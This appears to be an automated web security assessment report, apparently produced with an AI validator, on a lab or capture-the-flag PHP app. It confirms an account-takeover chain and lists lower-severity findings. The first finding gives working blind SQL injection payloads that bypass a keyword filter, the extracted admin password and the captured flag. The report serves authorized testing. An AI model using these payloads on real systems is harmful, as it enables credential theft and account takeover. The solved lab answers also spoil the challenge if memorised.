# VERDICT Security Assessment Report

## Contents

- [Assessment Information](#assessment-information)
- [Scope](#scope)
- [Summary](#summary)
- [Findings](#findings)
    - [1. HIGH — workflow-bypass Account takeover chain: plaintext admin password exfiltrated via search.php blind SQLi, replayed at login.php](#finding-1)
    - [2. MEDIUM — session PHP Session Cookie (PHPSESSID) Missing HttpOnly Flag](#finding-2)
    - [3. INFO — info-disclosure Apache Server Version Disclosed in Error Pages](#finding-3)
- [Suspected (needs manual verification)](#suspected-needs-manual-verification)
    - [4. HIGH — sqli SQL Injection Protected Only by Keyword WAF at /search.php](#finding-4)
    - [5. HIGH — vulnerable-component Outdated Apache httpd 2.4.54 — CVE-2023-25690 mod_proxy HTTP request smuggling](#finding-5)
    - [6. HIGH — vulnerable-component Outdated / EOL PHP 7.4.33 — CVE-2023-3824 phar stack buffer overflow (RCE-class)](#finding-6)
    - [7. MEDIUM — idor Unauthenticated Account Oracle — Username Enumeration at /search.php](#finding-7)

## Assessment Information

| | |
|---|---|
| Assessment ID | `a-mr1kd9qq-59cdj9` |
| Target | http://target.local:8080/ |
| Started | 2026-07-01T04:16:51.109Z |
| Generated | 2026-07-02T00:00:00.000Z |
| Phase | report |
| Screens | 4 mapped · 4 scanned · 0 remaining |
| Hypotheses | 0 (0 confirmed) |
| Findings | 3 |
| Tooling | VERDICT |

## Scope

- **In-scope hosts**: `target.local:8080`
- **Out-of-scope hosts**: —
- **In-scope paths**: `/`
- **Out-of-scope paths**: —
- **Rate**: 30 req/min, max 2 concurrent

## Summary

3 finding(s): 1 high, 1 medium, 1 info

_Plus 4 suspected lead(s) needing manual verification — listed separately below, NOT counted above._

## Findings

<a id="finding-1"></a>

### 1. [HIGH] [workflow-bypass] Account takeover chain: plaintext admin password exfiltrated via search.php blind SQLi, replayed at login.php

- Screen: `(cross-screen)`
- Source: validator `claude-pilot`
- Scope basis: authorized target http://target.local:8080/

A two-endpoint chain yields full takeover of the `admin` account (the "beta program" login the operator asked about; passwords were "forgotten" and are recovered here). `/search.php` is blind-SQL-injectable in a DOUBLE-QUOTE string context (`WHERE username="$input"`; single quotes are escaped but `"` is not). A keyword blacklist ("some item is filtered!") blocks ` OR ` (spaced), `and`, `where`, `limit`, `--`, `substring`, `ascii`, `substr`, and co-occurring `union`+`select`, but is trivially bypassed: spaces via `/**/`, `#` for comments, `mid()`+`ord()` for extraction, lowercase `/**/or/**/`. Using the boolean oracle "User exists: admin" vs "No results", the users table was shown to hold exactly one row and admin's 18-char PLAINTEXT password was extracted byte-by-byte with `ord(mid((select password from users),N,1))>K`, then confirmed case-sensitively via `(select password from users)=binary"ThisIsBestPassword"` → "User exists: admin" (evidence ev-mr1m08vr-73). Replaying the recovered credentials at `/login.php` (username=admin, password=ThisIsBestPassword) authenticates and returns admin content: "Congratz, flag is flag{787d5a7f-ec79-4620-99c5-17c50dced80a}" (evidence ev-mr1m0h3t-74). `/login.php` itself is NOT injectable, so this is genuine account takeover using recovered credentials. Storing passwords in plaintext (directly reusable once leaked) compounds the impact. This is distinct from the previously-recorded single-request SQLi on /search.php — it is the cross-endpoint chain reaching admin takeover.

**Reproduction**

```
1) Confirm double-quote injection: POST /search.php `username=zzz"/**/or/**/"a"="a` → "User exists: admin" (single-quote variant is escaped → "No results"). 2) Confirm oracle + single user row: `username=zzz"/**/or/**/(select/**/count(username)/**/from/**/users)=1#` → "User exists: admin". 3) Extract the password: `username=zzz"/**/or/**/ord(mid((select/**/password/**/from/**/users),N,1))>K#` for N=1..18; verify full string: `username=zzz"/**/or/**/(select/**/password/**/from/**/users)=binary"ThisIsBestPassword"#` → "User exists: admin" (ev-mr1m08vr-73). 4) Log in: POST /login.php `username=admin&password=ThisIsBestPassword` → 200 "Congratz, flag is flag{787d5a7f-ec79-4620-99c5-17c50dced80a}" (ev-mr1m0h3t-74). Differential proof (probe_scenario): control admin+wrong-password → no "Congratz" (ev-mr1m1h5l-75); exploit admin+recovered-password → "Congratz" on both replays (ev-mr1m1hf3-76, ev-mr1m1ho0-77).
```

**Evidence**

- Evidence `ev-mr1m1h5l-75` — `artifacts/_/ev-mr1m1h5l-75/`

Request:

```http
POST /login.php HTTP/1.1
Host: target.local:8080
user-agent: verdict-scanner/0.1
x-verdict: assessment
Content-Type: application/x-www-form-urlencoded

username=admin&password=WrongControlPassword
```

Response:

```http
HTTP/1.1 200
cache-control: no-store, no-cache, must-revalidate
connection: Keep-Alive
content-length: 536
content-type: text/html; charset=UTF-8
date: Wed, 01 Jul 2026 05:03:39 GMT
expires: Thu, 19 Nov 1981 08:52:00 GMT
keep-alive: timeout=5, max=100
pragma: no-cache
server: Apache/2.4.54 (Debian)
set-cookie: <redacted>
vary: Accept-Encoding
x-powered-by: PHP/7.4.33

Error! 
<!-- The login form --> 
<form action="login.php" method="POST">
    <div class="form-group">
        <label for="user">Username:</label>
        <input type="text" class="form-control" id="username" name="username" required>
    </div>
    <div class="form-group">
        <label for="pwd">Password:</label>
        <input type="password" class="form-control" id="password" name="password" required>
    </div>
    <button type="submit" class="btn btn-default">Login</button>
</form>

<a href="/index.php">Back to index</a><br>
```

- Evidence `ev-mr1m1hf3-76` — `artifacts/_/ev-mr1m1hf3-76/`

Request:

```http
POST /login.php HTTP/1.1
Host: target.local:8080
user-agent: verdict-scanner/0.1
x-verdict: assessment
Content-Type: application/x-www-form-urlencoded

username=admin&password=ThisIsBestPassword
```

Response:

```http
HTTP/1.1 200
cache-control: no-store, no-cache, must-revalidate
connection: Keep-Alive
content-length: 60
content-type: text/html; charset=UTF-8
date: Wed, 01 Jul 2026 05:03:40 GMT
expires: Thu, 19 Nov 1981 08:52:00 GMT
keep-alive: timeout=5, max=99
pragma: no-cache
server: Apache/2.4.54 (Debian)
set-cookie: <redacted>
x-powered-by: PHP/7.4.33

Congratz, flag is flag{787d5a7f-ec79-4620-99c5-17c50dced80a}
```

- Evidence `ev-mr1m1ho0-77` — `artifacts/_/ev-mr1m1ho0-77/`

Request:

```http
POST /login.php HTTP/1.1
Host: target.local:8080
user-agent: verdict-scanner/0.1
x-verdict: assessment
Content-Type: application/x-www-form-urlencoded

username=admin&password=ThisIsBestPassword
```

Response:

```http
HTTP/1.1 200
cache-control: no-store, no-cache, must-revalidate
connection: Keep-Alive
content-length: 60
content-type: text/html; charset=UTF-8
date: Wed, 01 Jul 2026 05:03:40 GMT
expires: Thu, 19 Nov 1981 08:52:00 GMT
keep-alive: timeout=5, max=98
pragma: no-cache
server: Apache/2.4.54 (Debian)
set-cookie: <redacted>
x-powered-by: PHP/7.4.33

Congratz, flag is flag{787d5a7f-ec79-4620-99c5-17c50dced80a}
```

<a id="finding-2"></a>

### 2. [MEDIUM] [session] PHP Session Cookie (PHPSESSID) Missing HttpOnly Flag

- Screen: `s-0001`
- Source: validator `claude-pilot`
- Scope basis: authorized target http://target.local:8080/

Every response from the PHP application sets a PHPSESSID session cookie without the HttpOnly flag. This means client-side JavaScript can read the session token (via document.cookie), enabling complete session theft if any XSS vulnerability is present — a common follow-on attack path. The cookie also lacks the Secure flag (though the site is HTTP-only), and is SameSite=Lax, which does not compensate for the missing HttpOnly.

**Reproduction**

```
1. Send a fresh GET / request (no prior cookies). 2. Observe the Set-Cookie response header: `PHPSESSID=<hex>; path=/` — no HttpOnly, no Secure. 3. Contrast with /server-status (Apache, 403): no Set-Cookie header at all, confirming the missing flag is specific to the PHP application layer. 4. Confirmed stable across multiple independent requests (ev-mr1khwh3-4, ev-mr1kis1l-5).
```

**Evidence**

- Evidence `ev-mr1kjvjy-6` — `artifacts/s-0001/ev-mr1kjvjy-6/`

Request:

```http
GET /server-status HTTP/1.1
Host: target.local:8080
user-agent: verdict-scanner/0.1
x-verdict: assessment
```

Response:

```http
HTTP/1.1 403
connection: Keep-Alive
content-length: 281
content-type: text/html; charset=iso-8859-1
date: Wed, 01 Jul 2026 04:21:59 GMT
keep-alive: timeout=5, max=100
server: Apache/2.4.54 (Debian)

<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>403 Forbidden</title>
</head><body>
<h1>Forbidden</h1>
<p>You don't have permission to access this resource.</p>
<hr>
<address>Apache/2.4.54 (Debian) Server at target.local Port 8080</address>
</body></html>
```

- Evidence `ev-mr1khwh3-4` — `artifacts/s-0001/ev-mr1khwh3-4/`

Request:

```http
GET / HTTP/1.1
Host: target.local:8080
user-agent: verdict-scanner/0.1
x-verdict: assessment
cookie: <redacted>
authorization: <redacted>
```

Response:

```http
HTTP/1.1 200
cache-control: no-store, no-cache, must-revalidate
connection: Keep-Alive
content-length: 229
content-type: text/html; charset=UTF-8
date: Wed, 01 Jul 2026 04:20:26 GMT
expires: Thu, 19 Nov 1981 08:52:00 GMT
keep-alive: timeout=5, max=100
pragma: no-cache
server: Apache/2.4.54 (Debian)
set-cookie: <redacted>
vary: Accept-Encoding
x-powered-by: PHP/7.4.33

 

    <html>
    <head><title>PHPAbUsers</title></head>
    <body>
        <p><h3>Available functions</h3></p>
        <a href="/search.php">Search users</a><br>
        <a href="/login.php">Login</a><br>
    </body>
    </html>
```

- Evidence `ev-mr1kis1l-5` — `artifacts/s-0001/ev-mr1kis1l-5/`

Request:

```http
GET / HTTP/1.1
Host: target.local:8080
user-agent: verdict-scanner/0.1
x-verdict: assessment
cookie: <redacted>
authorization: <redacted>
```

Response:

```http
HTTP/1.1 200
cache-control: no-store, no-cache, must-revalidate
connection: Keep-Alive
content-length: 229
content-type: text/html; charset=UTF-8
date: Wed, 01 Jul 2026 04:21:07 GMT
expires: Thu, 19 Nov 1981 08:52:00 GMT
keep-alive: timeout=5, max=100
pragma: no-cache
server: Apache/2.4.54 (Debian)
set-cookie: <redacted>
vary: Accept-Encoding
x-powered-by: PHP/7.4.33

 

    <html>
    <head><title>PHPAbUsers</title></head>
    <body>
        <p><h3>Available functions</h3></p>
        <a href="/search.php">Search users</a><br>
        <a href="/login.php">Login</a><br>
    </body>
    </html>
```

<a id="finding-3"></a>

### 3. [INFO] [info-disclosure] Apache Server Version Disclosed in Error Pages

- Screen: `s-0001`
- Source: validator `claude-pilot`
- Scope basis: authorized target http://target.local:8080/

Apache error responses include the exact server version and OS in their HTML footer: `Apache/2.4.54 (Debian)`. This aids targeted exploitation of version-specific CVEs. The root page (200) does not include this string, so exposure is limited to error-path responses.

**Reproduction**

```
1. GET /server-status (twice) → 403: both responses contain `Apache/2.4.54 (Debian) Server at target.local Port 8080` in the footer. 2. GET / → 200: no server version string in the body (control).
```

**Evidence**

- Evidence `ev-mr1kfphp-1` — `artifacts/s-0001/ev-mr1kfphp-1/`

Request:

```http
GET / HTTP/1.1
Host: target.local:8080
user-agent: verdict-scanner/0.1
x-verdict: assessment
```

Response:

```http
HTTP/1.1 200
cache-control: no-store, no-cache, must-revalidate
connection: Keep-Alive
content-length: 229
content-type: text/html; charset=UTF-8
date: Wed, 01 Jul 2026 04:18:44 GMT
expires: Thu, 19 Nov 1981 08:52:00 GMT
keep-alive: timeout=5, max=100
pragma: no-cache
server: Apache/2.4.54 (Debian)
set-cookie: <redacted>
vary: Accept-Encoding
x-powered-by: PHP/7.4.33

 

    <html>
    <head><title>PHPAbUsers</title></head>
    <body>
        <p><h3>Available functions</h3></p>
        <a href="/search.php">Search users</a><br>
        <a href="/login.php">Login</a><br>
    </body>
    </html>
```

- Evidence `ev-mr1kjvjy-6` — `artifacts/s-0001/ev-mr1kjvjy-6/`

Request:

```http
GET /server-status HTTP/1.1
Host: target.local:8080
user-agent: verdict-scanner/0.1
x-verdict: assessment
```

Response:

```http
HTTP/1.1 403
connection: Keep-Alive
content-length: 281
content-type: text/html; charset=iso-8859-1
date: Wed, 01 Jul 2026 04:21:59 GMT
keep-alive: timeout=5, max=100
server: Apache/2.4.54 (Debian)

<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>403 Forbidden</title>
</head><body>
<h1>Forbidden</h1>
<p>You don't have permission to access this resource.</p>
<hr>
<address>Apache/2.4.54 (Debian) Server at target.local Port 8080</address>
</body></html>
```

- Evidence `ev-mr1klitu-8` — `artifacts/s-0001/ev-mr1klitu-8/`

Request:

```http
GET /server-status HTTP/1.1
Host: target.local:8080
user-agent: verdict-scanner/0.1
x-verdict: assessment
```

Response:

```http
HTTP/1.1 403
connection: Keep-Alive
content-length: 281
content-type: text/html; charset=iso-8859-1
date: Wed, 01 Jul 2026 04:23:15 GMT
keep-alive: timeout=5, max=100
server: Apache/2.4.54 (Debian)

<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>403 Forbidden</title>
</head><body>
<h1>Forbidden</h1>
<p>You don't have permission to access this resource.</p>
<hr>
<address>Apache/2.4.54 (Debian) Server at target.local Port 8080</address>
</body></html>
```

## Suspected (needs manual verification)

_Leads with one concrete observed anomaly but without control+2-replay confirmation. NOT counted in the confirmed total above — verify before relying on them._

<a id="finding-4"></a>

### 4. [SUSPECTED] [HIGH] [sqli] SQL Injection Protected Only by Keyword WAF at /search.php

- Screen: `s-0002`
- Source: validator `claude-pilot`
- Scope basis: authorized target http://target.local:8080/

**Anomaly (why this is a lead):** The /search.php username param passes single-quote characters to the DB layer without triggering "some item is filtered" (adm'in → "No results" changes from baseline "User exists: admin"), yet every SQL keyword is blocked: OR, AND, UNION, SELECT, LIKE, REGEXP, XOR, RLIKE, SLEEP, BENCHMARK, IN, ||, &&, and `-- ` with trailing space. This asymmetry — quote characters allowed, all logical/set operators blocked — is characteristic of a keyword-based WAF layered over an unparameterized string-concatenation query. The boolean test admin'# returned "No results" rather than "User exists: admin", which is ambiguous (parameterized OR hash-handled differently). Bypass via multi-byte charset, HTTP param pollution, or non-blocked functions (EXTRACTVALUE, UPDATEXML) was not attempted; manual investigation warranted.

POST /search.php applies a keyword-blocklist WAF that filters OR, AND, UNION, SELECT, and many other SQL operators while allowing raw single-quote characters through to the query layer. The underlying query may be unparameterized; if the WAF can be bypassed (encoding tricks, alternate operator syntax, multi-byte charset), error-based or blind SQL injection may be achievable.

**Reproduction**

```
1. POST /search.php body=username=admin → "User exists: admin" (baseline)\n2. POST body=username=adm'in → "No results" (single quote changes behavior)\n3. POST body=username=' OR '1'='1 → "some item is filtered" (OR blocked)\n4. POST body=username=' UNION SELECT 1-- → "some item is filtered" (UNION+SELECT blocked)\n5. POST body=username=admin'# → "No results" (# comment not effective or param is sanitized)\nAll SQL operators blocked; quote character itself passes unfiltered.
```

**Evidence**

- Evidence `ev-mr1kn6aq-h` — `artifacts/s-0002/ev-mr1kn6aq-h/`

Request:

```http
POST /search.php HTTP/1.1
Host: target.local:8080
user-agent: verdict-scanner/0.1
x-verdict: assessment
Content-Type: application/x-www-form-urlencoded

username=admin%27--
```

Response:

```http
HTTP/1.1 200
connection: Keep-Alive
content-length: 372
content-type: text/html; charset=UTF-8
date: Wed, 01 Jul 2026 04:24:32 GMT
keep-alive: timeout=5, max=100
server: Apache/2.4.54 (Debian)
vary: Accept-Encoding
x-powered-by: PHP/7.4.33

You are connected successfully!<br/> No results
<!-- The search form --> 
<form action="search.php" method="POST">
<div class="form-group">
  <label for="user">Username:</label>
  <input type="text" class="form-control" id="username" name="username">
</div>
<button type="submit" class="btn btn-default">Validate</button>
</form>
<a href="/index.php">Back to index</a><br>
```

<a id="finding-5"></a>

### 5. [SUSPECTED] [HIGH] [vulnerable-component] Outdated Apache httpd 2.4.54 — CVE-2023-25690 mod_proxy HTTP request smuggling

- Screen: `(cross-screen)`
- Source: validator `claude-pilot`
- Scope basis: authorized target http://target.local:8080/

**Anomaly (why this is a lead):** Apache/2.4.54 (Debian) detected via the Server response header at the root. 2.4.54 predates the fix for CVE-2023-25690 (HTTP request smuggling in mod_proxy with certain RewriteRule/ProxyPassMatch configs, CVSS 9.8, fixed 2.4.56) and CVE-2024-38475 (mod_rewrite improper escaping → source disclosure/SSRF, fixed 2.4.60). Version-based match; smuggling is config-dependent (needs mod_proxy + rewrite) and not yet exploited here.

Server banner Apache/2.4.54 (Debian) is behind current (2.4.62+). Worst known exploitable-class issue fixed in later branches: CVE-2023-25690 — request smuggling via mod_proxy + RewriteRule (CVSS 9.8, fixed 2.4.56); also CVE-2024-38475 mod_rewrite improper escaping → potential source disclosure/SSRF (fixed 2.4.60). These are version-based (banner) matches, not actively exploited — exploitability depends on whether mod_proxy/mod_rewrite are configured with the vulnerable patterns. Remediation: upgrade Apache httpd to the current 2.4.x.

[+] Also observed as "Outdated / EOL PHP 7.4.33 — CVE-2023-3824 phar stack buffer overflow (RCE-class)".

**Reproduction**

```
GET http://target.local:8080/ → response header `Server: Apache/2.4.54 (Debian)`. Cross-reference version 2.4.54 against Apache security advisories: CVE-2023-25690 (fixed 2.4.56), CVE-2024-38475 (fixed 2.4.60). No active smuggling PoC fired — would require confirming a vulnerable mod_proxy RewriteRule config.
```

**Evidence**

- Evidence `ev-mr1m4be8-7n` — `artifacts/_/ev-mr1m4be8-7n/`

Request:

```http
GET / HTTP/1.1
Host: target.local:8080
user-agent: verdict-scanner/0.1
x-verdict: assessment
```

Response:

```http
HTTP/1.1 200
cache-control: no-store, no-cache, must-revalidate
connection: Keep-Alive
content-length: 229
content-type: text/html; charset=UTF-8
date: Wed, 01 Jul 2026 05:05:52 GMT
expires: Thu, 19 Nov 1981 08:52:00 GMT
keep-alive: timeout=5, max=100
pragma: no-cache
server: Apache/2.4.54 (Debian)
set-cookie: <redacted>
vary: Accept-Encoding
x-powered-by: PHP/7.4.33

 

    <html>
    <head><title>PHPAbUsers</title></head>
    <body>
        <p><h3>Available functions</h3></p>
        <a href="/search.php">Search users</a><br>
        <a href="/login.php">Login</a><br>
    </body>
    </html>
```

<a id="finding-6"></a>

### 6. [SUSPECTED] [HIGH] [vulnerable-component] Outdated / EOL PHP 7.4.33 — CVE-2023-3824 phar stack buffer overflow (RCE-class)

- Screen: `(cross-screen)`
- Source: validator `claude-pilot`
- Scope basis: authorized target http://target.local:8080/

**Anomaly (why this is a lead):** PHP/7.4.33 detected via the X-Powered-By header (and PHPSESSID cookie) at the root. 7.4.33 is the last 7.4 release; the branch reached end-of-life 2022-11-28 and receives no security fixes. CVE-2023-3824 (insufficient length check on phar directory entries → stack buffer overflow → memory corruption/RCE) was patched only in 8.0.30/8.1.22/8.2.8 and never backported to EOL 7.4, so 7.4.33 is unpatched. Version-based RCE-class lead, not yet exploited (needs a phar-loading sink).

X-Powered-By: PHP/7.4.33 (corroborated by the PHPSESSID Set-Cookie) exposes an end-of-life PHP branch (7.4 EOL 2022-11-28) that receives no further security patches. Concrete unpatched exploitable-class CVE: CVE-2023-3824 — stack buffer overflow while reading phar directory entries, potential memory corruption/RCE; fixed in PHP 8.0.30/8.1.22/8.2.8 only. This is a version-based (banner) match, not actively exploited — CVE-2023-3824 requires reaching a phar deserialization/loading sink. Remediation: migrate to a supported PHP release (8.2+). Note: CVE-2024-4577 (PHP-CGI arg injection) is NOT cited as it is Windows/CGI-specific and this host is Debian.

**Reproduction**

```
GET http://target.local:8080/ → response header `X-Powered-By: PHP/7.4.33` and `Set-Cookie: PHPSESSID=...`. Cross-reference 7.4.33 against PHP release history: 7.4 branch EOL 2022-11-28; CVE-2023-3824 fixed only in 8.0.30/8.1.22/8.2.8, never in 7.4. No active PoC fired — no phar-loading endpoint identified to safely demonstrate.
```

**Evidence**

- Evidence `ev-mr1m4be8-7n` — `artifacts/_/ev-mr1m4be8-7n/`

Request:

```http
GET / HTTP/1.1
Host: target.local:8080
user-agent: verdict-scanner/0.1
x-verdict: assessment
```

Response:

```http
HTTP/1.1 200
cache-control: no-store, no-cache, must-revalidate
connection: Keep-Alive
content-length: 229
content-type: text/html; charset=UTF-8
date: Wed, 01 Jul 2026 05:05:52 GMT
expires: Thu, 19 Nov 1981 08:52:00 GMT
keep-alive: timeout=5, max=100
pragma: no-cache
server: Apache/2.4.54 (Debian)
set-cookie: <redacted>
vary: Accept-Encoding
x-powered-by: PHP/7.4.33

 

    <html>
    <head><title>PHPAbUsers</title></head>
    <body>
        <p><h3>Available functions</h3></p>
        <a href="/search.php">Search users</a><br>
        <a href="/login.php">Login</a><br>
    </body>
    </html>
```

<a id="finding-7"></a>

### 7. [SUSPECTED] [MEDIUM] [idor] Unauthenticated Account Oracle — Username Enumeration at /search.php

- Screen: `s-0002`
- Source: validator `claude-pilot`
- Scope basis: authorized target http://target.local:8080/

**Anomaly (why this is a lead):** POST /search.php with username=admin and NO auth returns 385-byte "User exists: admin"; same request with username=nonexistentxyz999 returns 372-byte "No results". The 13-byte body differential and literal "User exists" marker expose an unauthenticated account oracle. Two independent replays (ev-mr1kvrky-1f: 385 B, ev-mr1ky6bd-1h: 385 B) confirm stability. Evidence recorder rejects confirmed verdict for same-HTTP-status (200) differential findings — manual verification of the body-content difference will upgrade this.

POST /search.php returns "User exists: &lt;name&gt;" for valid accounts and "No results" for non-existent ones, with no authentication required. Any unauthenticated visitor can enumerate valid usernames (e.g., "admin" confirmed), enabling targeted brute-force or credential-stuffing attacks.

**Reproduction**

```
1. POST http://target.local:8080/search.php\n   Content-Type: application/x-www-form-urlencoded, no auth\n   Body: username=admin\n   → 385-byte response: "User exists: admin"\n2. Same endpoint, body: username=nonexistentxyz999\n   → 372-byte response: "No results"
```

**Evidence**

- Evidence `ev-mr1kvrky-1f` — `artifacts/s-0002/ev-mr1kvrky-1f/`

Request:

```http
POST /search.php HTTP/1.1
Host: target.local:8080
user-agent: verdict-scanner/0.1
x-verdict: assessment
Content-Type: application/x-www-form-urlencoded

username=admin
```

Response:

```http
HTTP/1.1 200
connection: Keep-Alive
content-length: 385
content-type: text/html; charset=UTF-8
date: Wed, 01 Jul 2026 04:31:13 GMT
keep-alive: timeout=5, max=99
server: Apache/2.4.54 (Debian)
vary: Accept-Encoding
x-powered-by: PHP/7.4.33

You are connected successfully!<br/> User exists: admin<br/>
<!-- The search form --> 
<form action="search.php" method="POST">
<div class="form-group">
  <label for="user">Username:</label>
  <input type="text" class="form-control" id="username" name="username">
</div>
<button type="submit" class="btn btn-default">Validate</button>
</form>
<a href="/index.php">Back to index</a><br>
```
